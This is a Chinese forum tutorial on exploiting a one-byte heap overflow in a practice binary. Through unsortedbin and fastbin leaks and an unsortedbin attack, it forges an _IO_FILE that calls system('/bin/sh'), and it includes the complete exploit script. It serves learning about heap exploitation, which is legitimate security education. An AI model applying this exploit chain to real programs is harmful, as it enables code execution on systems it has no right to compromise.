> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1546193-1-1.html)

> [md]有疑惑的话可以从前面几节看起，相关内容可以看我的 [博客](https://hack1s.fun/) 这一节的内容是 Off-By-One 相比于溢出、UAF、Double Free 等漏洞，Off-By......

 ![](https://avatar.52pojie.cn/data/avatar/001/57/34/12_avatar_middle.jpg) 呆毛王与咖喱棒

有疑惑的话可以从前面几节看起，相关内容可以看我的[博客](https://hack1s.fun/)

这一节的内容是 Off-By-One

相比于溢出、UAF、Double Free 等漏洞，Off-By-One 其实更加容易出现

Off-By-One 是指在程序输入时由于边界条件没有检查好，导致能够多输入一个字节的漏洞；

还有更加特殊的情况——Off-By-Null，即能够多输入一个`\x00`字符

在栈上如果仅仅只是能多输入一个字符，这样一般也很难造成特别大的影响，但是堆就不一样了。

堆上的一个特殊地方就在于`prev_inuse`位

这个位用来标识前一个 chunk 是否是在用的状态，如果将一个位清零，就可能让堆管理器认为前一个 chunk 是 free 的状态，从而分配两次，进一步能导致 UAF 的问题。

在实践之前还需要了解一个堆的机制，Remaindering

Remaindering
------------

Remaindering 实际上就是当无法直接申请到大小合适的 chunk 时，`malloc`将一个 free chunk 分为两个小的 chunk，并将其中一个合适大小的分配出去，剩余的 chunk 加到 unsortebin 中的过程。

这种处理方式会在三种情况下出现：

*   从 largebins 中分配时
*   搜索 binmap 过程中
*   unsortedbin 遍历时

这一节中的内容涉及到的是 unsortedbin 遍历时的情况，另外两种情况在后面学习时进行介绍；

再看一眼这个堆结构图

![](https://static.hack1s.fun/images/2021/03/10/image-20210310161659389.png)

其中在 Top Chunk 和 unsortedbin 的 fd 之间有一项`last_remainder`

这个字段存储的 chunk 仅仅可用于大小处于 smallbin 的申请

```
          if (in_smallbin_range (nb) &&
              bck == unsorted_chunks (av) &&
              victim == av->last_remainder &&
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */

```

在遍历 unsortedbin 时，如果满足了这样的条件则会从`last_remainder`中申请分配 chunk

实践
--

文字上的描述看起来又臭又长，还是直接用实例看一下吧。

![](https://static.hack1s.fun/images/2021/11/07/image-20211107181407166.png)

可以看到这个例子程序安全保护机制全开

运行的时候支持这么几种常见的功能: 申请、编辑、读、释放

相比之前的示例程序，这个程序并没有输出堆的地址和 libc 的地址

因此我们在利用时首先需要泄漏 libc

但是并不能决定 malloc 的大小，每次申请的内存都是 0x60

<img src="[https://static.hack1s.fun/images/2021/11/07/image-20211107182339845.png](https://static.hack1s.fun/images/2021/11/07/image-20211107182339845.png)"alt="image-20211107182339845" />

虽然菜单写的是 malloc，但是实际上程序申请内存使用的是`calloc`

两者的差别主要是`calloc`申请内存后会将内容置 0

漏洞点是`edit`功能可以编辑比`malloc`的大小多一个字节的内容

![](https://static.hack1s.fun/images/2021/11/16/image-20211108135109353.png)

### 泄漏 libc 地址

想要泄漏出 libc 的地址，可以考虑使用 unsortedbin leak

```
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()

edit(chunk_A,b'Y'*0x58 + b'\xc1')
free(chunk_B)

```

首先我们修改 chunk_B 的大小为 0xc1

为两个 0x60，这样 chunk_B 就包含了申请时的 B 和 C

这时 free 掉 chunk_B 会被加入到 unsortedbin 中

由于 unsortedbin 目前只有这一项，fd、bk 都会指向 main_arena

![](https://static.hack1s.fun/images/2021/11/08/image-20211108141053515.png)

如果能设法读到 fd 和 bk

就可以得到一个 libc 中的地址

那么问题来了，这时我们再申请一个 chunk，这个 chunk 的起始位置会在哪里呢？

![](https://static.hack1s.fun/images/2021/11/15/image-20211115184628435.png)

可以看到再次申请的 chunk 还是在 B 的位置

![](https://static.hack1s.fun/images/2021/11/15/image-20211115184923962.png)

原本大小为 0xc0 的 unsortedbin 发生了 remaindering，切分为了两部分

其中 0x60 分配给我们这次的申请，另外的 0x60 又重新被放到了 unsortedbin 中，也就是我们原本 C 的位置

看到发生了 remaindering 之后，`main_arena.last_remainder`中的值变成了切分下来的这个部分；

那么接下来直接读 C 的内容就可以得到图中`0x7fffd7dd4b78`这个指针了

这个值减去 88 就是 main_arena 的地址，由此得到了一个 libc 的地址

```
offset = lib.sym.main_arena + 88

data = u64(read(chunk_C)[:8])

libc.address = data - offset

```

### 泄漏堆地址

现在我们有了一个泄漏的 libc 地址，就可以利用 house_of_orange 中的技巧，用 unsortedbin attack 尝试覆盖`_IO_list_all`的 vtable 了

这样我们需要在堆上伪造一个`_IO_FILE`出来，但是要确定 vtable 的值还需要泄漏一个堆上的地址

那么我们就可以利用目前 chunk_C 这里的双重指针，构造出一个 fastbin 的 fd

```
chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

```

这样 chunk_C 的前 8 个字节就变成了一个 fastbin 的 fd，指向的是 chunk_A 的位置即堆的起始地址

![](https://static.hack1s.fun/images/2021/11/16/image-20211116133127445.png)

```
heap = u64(read(chunk_C)[:8])
log.info(f"heap @ {heap:02x}")

```

### unsortedbin attack

接下来就是利用 unsortedbin attack 完成之前 house of orange 中的最后一步

修改`_IO_list_all`

这里要完成 unsortedbin attack 我们其实可以在获取 libc 地址和获取堆地址之间完成

```
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()

edit(chunk_A,b'Y'*0x58 + b'\xc1')
free(chunk_B)

offset = lib.sym.main_arena + 88
data = u64(read(chunk_C)[:8])
libc.address = data - offset
log.info(f"libc @ {libc:02x}")

edit(chunk_C, p64(0) + p64(libc.sym._IO_list_all - 0x10))

chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

heap = u64(read(chunk_C)[:8])
log.info(f"heap @ {heap:02x}")

```

只需要加一句`edit(chunk_C)`就可以

回忆一下 unsortedbin attack，我们只要控制了 bk，就可以在任意位置写入一个当前 chunk 的地址；

将 fd 设置为任意值，bk 设置为`_IO_list_all - 0x10`

这样就可以将`_IO_list_all`覆盖为 chunk_C 的地址了

![](https://static.hack1s.fun/images/2021/11/16/image-20211116155238895.png)

接下来需要做的是在堆上构造一个 `_IO_FILE`，我们可以先直接将之前 house of orange 中的 payload 复制过来

```
payload = b"Y"*0x10
flag = b'/bin/sh\x00'

fake_size = p64(0x61)
fd = p64(0)
bk = p64(libc.sym._IO_list_all - 0x10)
write_base = p64(1)
write_ptr = p64(2)
mode = p32(0)
vtable = p64(heap + 0xd8)                                                                                                                             
overflow = p64(libc.sym.system)

payload = payload + flag
payload = payload + fake_size
payload = payload + fd
payload = payload + bk
payload = payload + write_base
payload = payload + write_ptr
payload = payload + p64(0)*18
payload = payload + mode + p32(0) + p64(0) + overflow
payload = payload + vtable

```

这里面有一部分最初的填充是不需要的，另外`vtable`的值可能也需要变一变

去掉开头的填充后整个 payload 的长度是 224，即 0xE0

如果从 chunk_C 开始算起，那么我们还是需要三个 0x60 大小的 chunk 来放这些内容

```
edit(chunk_B,p64(0)*10+b"/bin/sh\x00")
edit(chunk_C,p64(fd)+p64(bk)+p64(1)+p64(2))
edit(chunk_E,p64(libc.sym.system)+p64(vtable))

```

计算之后 vtable 的值应该设置为`heap+0x178`

![](https://static.hack1s.fun/images/2021/11/16/image-20211116193809247.png)

图中绿色是`/bin/sh`的字符串

粉色是`write_base`和`write_ptr`，已经设置为了 1 和 2

红色是`overflow`函数指针，设置为了`system`的地址

蓝色是`vtable`指针，重新指向了`heap+0x178`处

这时只要再次 malloc，将 unsortedbin sort 到 0x60 的 smallbin 中，`_IO_list_all`就会顺着`_chain`指向我们伪造的`_IO_FILE`

* * *

但是再次 malloc 会发现，什么都没有发生

这是因为我们申请的 chunk 大小本身就是`0x60`，再次 malloc 时这个 unsortebin 根本不会 sort，由于大小刚刚好，直接就给我们分配过来了

跟着`_IO_list_all`的指针看一下，可以发现`_IO_list_all.file._chain._chain`还是在`main_arena`内

![](https://static.hack1s.fun/images/2021/11/16/image-20211116194429079.png)

对照着 arena 的分布图可以得知这个位置是 0xb0 大小的 smallbin

既然 0x60 的没办法 sort，那我们可以在申请前再一次利用 off by one 的漏洞把原本 0x60 大小的 unsortedbin 伪造为 0xb0 大小

这样让`_IO_list_all`指针指两层后再指向我们申请的 chunk_C 处

那么就是需要修改一下 chunk_B 的 edit 那句

```
edit(chunk_B,p64(0)*10+b"/bin/sh\x00"+b'\xb1')

```

最后增加了一个字节的修改

![](https://static.hack1s.fun/images/2021/11/16/image-20211116194819999.png)

修改完成之后，再次 malloc

![](https://static.hack1s.fun/images/2021/11/16/image-20211116195438001.png)

就得到了一个 shell

完整的 payload

```
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()

edit(chunk_A, b"Y"*0x50+ p64(0x60) + b'\xc1')

free(chunk_B)

chunk_B = malloc()
data = u64(read(chunk_C)[:8])
offset = libc.sym.main_arena + 0x58
libc.address = data - offset
log.info(f"libc @ 0x{libc.address:02x}")

chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

heap = u64(read(chunk_C)[:8])
log.info(f"heap @ 0x{heap:02x}")

chunk_C2 = malloc()
chunk_A = malloc()

edit(chunk_A, b"Y"*0x50 + p64(0x60)+b'\xc1')
free(chunk_B)

chunk_B = malloc()

vtable = heap + 0x178
edit(chunk_B,p64(0)*10+b'/bin/sh\x00\xb1')
edit(chunk_C,p64(0)+p64(libc.sym._IO_list_all-0x10)+p64(1)+p64(2))
edit(chunk_E,p64(libc.sym.system)+p64(vtable))

malloc()

```

总结
--

总结一下，栈漏洞中的溢出一个字节一般比较难造成很大影响

但是堆中的 off by one 可以覆盖 prev_inuse 位，导致有可能出现两个指针指向一块内存的情况，进一步可以用 unsortedbin leak 泄漏 libc 地址、fastbin 泄漏堆地址、unsortebin attack 结合伪造`_IO_FILE`一系列操作拿到 shell

  

![](https://static.52pojie.cn/static/image/filetype/zip.gif)

[off by one.zip](forum.php?mod=attachment&aid=MjM0ODQ1OHw3OTI4ODNkZnwxNjM3MzI4MjcyfDB8MTU0NjE5Mw%3D%3D)

2021-11-17 15:21 上传

点击文件名下载附件

下载积分: 吾爱币 -1 CB  

6.2 KB, 下载次数: 3, 下载积分: 吾爱币 -1 CB![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)Stomachache  
虽然我看不懂, 但是感觉和漏洞相关的都是很高大上的.![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)ds598177 虽然我看不懂, 但是感觉和漏洞相关的都是很高大上的.![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)YVKG 楼主 six six six![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)DXSN 学习到了 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) fengshengshou 先存后学，好厉害的样子~![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)taitancom 谢谢，看看先！![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)smnra 虽然我看不懂, 但是感觉和漏洞相关的都是很高大上的. ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) 流泪的小白 学习到了，感谢分享 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) jiamingzhang 好评 6666![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif)aresxin 楼主好厉害啊![](https://static.52pojie.cn/static/image/smiley/default/13.gif)我简直太菜了 ![](https://www.52pojie.cn/uc_server/images/noavatar_middle.gif) Ninol233 学习了学习了，十分感谢大哥的分享